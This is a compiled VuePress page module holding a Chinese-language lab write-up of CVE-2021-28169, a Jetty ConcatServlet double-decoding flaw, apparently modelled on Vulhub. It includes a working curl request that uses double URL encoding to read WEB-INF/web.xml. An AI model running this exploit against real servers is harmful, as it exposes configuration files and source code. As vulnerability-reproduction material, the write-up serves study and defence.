import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as c,o as s,c as r,a as e,b as t,d as n,e as l}from"./app-58e4a7d6.js";const o={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),p=e("p",null,"Eclipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境，而Jetty Servlets是Jetty提供给开发者的一些通用组件。",-1),u=e("p",null,[t("在9.4.40, 10.0.2, 11.0.2版本前，Jetty Servlets中的"),e("code",null,"ConcatServlet"),t("、"),e("code",null,"WelcomeFilter"),t("类存在多重解码问题，如果开发者主动使用了这两个类，攻击者可以利用其访问WEB-INF目录下的敏感文件，造成配置文件及代码泄露。")],-1),h=e("p",null,"参考链接：",-1),_={href:"https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq",target:"_blank",rel:"noopener noreferrer"},g=l(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Jetty 9.4.40服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>即可查看到一个example页面。该页面使用到了<code>ConcatServlet</code>来优化静态文件的加载：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;/static?/css/base.css&amp;/css/app.css&quot;&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241652563.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>正常通过<code>/static?/WEB-INF/web.xml</code>无法访问到敏感文件web.xml：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241653506.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>对字母<code>W</code>进行双URL编码，即可绕过限制访问web.xml：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -v &#39;http://your-ip:8080/static?/%2557EB-INF/web.xml&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241653568.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12);function m(b,v){const a=c("ExternalLinkIcon");return s(),r("div",null,[d,p,u,h,e("ul",null,[e("li",null,[e("a",_,[t("https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq"),n(a)])])]),g])}const y=i(o,[["render",m],["__file","Jetty 通用 Servlets 组件 ConcatServlet 信息泄露漏洞 CVE-2021-28169.html.vue"]]);export{y as default};
